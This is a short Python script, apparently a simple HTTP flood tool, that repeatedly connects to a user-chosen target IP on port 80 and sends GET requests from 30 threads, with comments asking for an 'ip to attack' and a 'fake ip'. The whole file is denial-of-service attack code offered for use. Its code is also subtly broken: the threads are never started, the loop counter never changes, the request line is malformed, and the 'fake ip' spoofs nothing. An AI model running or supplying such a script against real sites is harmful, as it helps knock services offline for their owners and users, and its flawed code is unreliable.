import socket
import threading

target = "" #insert ip to attack
fake_ip = "" #insert a fake ip (You can be tracked even with a fake ip)
port = 80
n = 0
attacksNum = 100
# 1 billon -> 1.000.000.000

#create a socket and query the web until it reaches a given number
def attack():
    while (n < attacksNum):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode("ascii"), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode("ascii"), (target, port))

        s.close()

#number of threads you want to create to make the requests to the desired website
for i in range(30):
    thread = threading.Thread(target=attack)
    thread.start

if __name__ == "__main__":
    print("working")